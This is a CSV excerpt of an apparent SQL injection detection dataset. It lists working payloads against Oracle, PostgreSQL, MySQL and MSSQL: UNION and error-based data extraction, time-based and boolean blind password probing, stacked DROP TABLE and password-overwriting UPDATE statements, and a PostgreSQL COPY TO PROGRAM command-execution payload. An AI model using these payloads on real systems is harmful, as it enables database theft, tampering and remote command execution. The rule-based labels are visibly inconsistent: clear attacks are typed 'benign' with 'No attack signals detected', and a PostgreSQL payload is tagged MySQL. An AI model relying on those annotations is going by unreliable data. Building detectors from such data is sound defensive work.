row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41400,"' UNION SELECT NULL,NULL FROM dual--",1,oracle_union,union_based,oracle,0.95,UNION SELECT detected — union_based injection (priority 7) on oracle,rule-based
41401,' AND 1=(SELECT COUNT(*) FROM all_tables)--,1,oracle_enum,benign,generic,0.8,No attack signals detected in payload,rule-based
41402,'; SELECT PG_SLEEP(5)--,1,pgsql_timebased,stacked_queries,mysql,0.95,; SELECT  detected — stacked_queries injection (priority 3) on mysql,rule-based
41403,"' UNION SELECT NULL::text,NULL::text--",1,pgsql_union,union_based,postgresql,0.95,UNION SELECT detected — union_based injection (priority 7) on postgresql,rule-based
41404,1;SELECT version()--,1,pgsql_enum,stacked_queries,generic,0.95,;SELECT  detected — stacked_queries injection (priority 3) on generic,rule-based
41405,' AND 1=(SELECT COUNT(*) FROM pg_tables)--,1,pgsql_enum,benign,generic,0.8,No attack signals detected in payload,rule-based
41406,'; COPY (SELECT '') TO PROGRAM 'id'--,1,pgsql_rce,benign,generic,0.8,No attack signals detected in payload,rule-based
41407,"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",1,error_extractvalue,error_based,generic,0.95,EXTRACTVALUE( detected — error_based injection (priority 4) on generic,rule-based
41408,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",1,error_updatexml,error_based,generic,0.95,UPDATEXML( detected — error_based injection (priority 4) on generic,rule-based
41409,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_floor_rand,error_based,mysql,0.95,"FLOOR(RAND, COUNT(*),CONCAT detected — error_based injection (priority 4) on mysql",rule-based
41410,"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",1,error_gtid,benign,generic,0.8,No attack signals detected in payload,rule-based
41411,"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",1,error_json,benign,generic,0.8,No attack signals detected in payload,rule-based
41412,1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,1,error_geometry,error_based,mysql,0.95,POLYGON( detected — error_based injection (priority 4) on mysql,rule-based
41413,' AND EXP(~(SELECT * FROM (SELECT user())x))--,1,error_exp,error_based,generic,0.95,EXP(~ detected — error_based injection (priority 4) on generic,rule-based
41414,' AND SLEEP(5) AND '1'='1,1,timebased_sleep,time_blind,mysql,0.95,"SLEEP(, AND SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41415,1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,1,timebased_subquery,time_blind,mysql,0.95,SLEEP( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41416,"' AND IF(1=1,SLEEP(5),0)--",1,timebased_if,time_blind,mysql,0.95,"SLEEP(, IF(1=1,SLEEP is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
41417,'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,1,timebased_if_mssql,time_blind,mssql,0.95,WAITFOR DELAY is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41418,1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,1,timebased_nested,time_blind,mysql,0.95,SLEEP( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41419,"' AND SUBSTRING(username,1,1)='a' AND '1'='1",1,boolean_substring,boolean_blind,generic,0.95,AND '1'='1 detected — boolean_blind injection (priority 8) on generic,rule-based
41420,"' AND ASCII(SUBSTR(username,1,1))>64--",1,boolean_ascii,benign,generic,0.8,No attack signals detected in payload,rule-based
41421,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,1,boolean_count,benign,generic,0.8,No attack signals detected in payload,rule-based
41422,"' AND MID(version(),1,1)='5'--",1,boolean_mid,benign,generic,0.8,No attack signals detected in payload,rule-based
41423,"' AND BINARY SUBSTRING(password,1,1)='a'--",1,boolean_binary,benign,generic,0.8,No attack signals detected in payload,rule-based
41424,' OR 1=1--,1,whitespace_tab,boolean_blind,generic,0.85,OR 1=1 detected — boolean_blind injection (priority 8) on generic,rule-based
41425,' OR 1 = 1--,1,whitespace_comment_heavy,boolean_blind,generic,0.85,OR 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
41426,'; DROP TABLE users; --,1,stacked_drop,stacked_queries,generic,0.95,"; DROP , DROP TABLE detected — stacked_queries injection (priority 3) on generic",rule-based
41427,"'; INSERT INTO users VALUES('hacker','pw')--",1,stacked_insert,stacked_queries,generic,0.95,; INSERT  detected — stacked_queries injection (priority 3) on generic,rule-based
41428,1'; UPDATE users SET password='hacked' WHERE '1'='1,1,stacked_update,stacked_queries,generic,0.95,; UPDATE  detected — stacked_queries injection (priority 3) on generic,rule-based
41429,'; EXEC('SELECT 1')--,1,stacked_exec,benign,generic,0.8,No attack signals detected in payload,rule-based
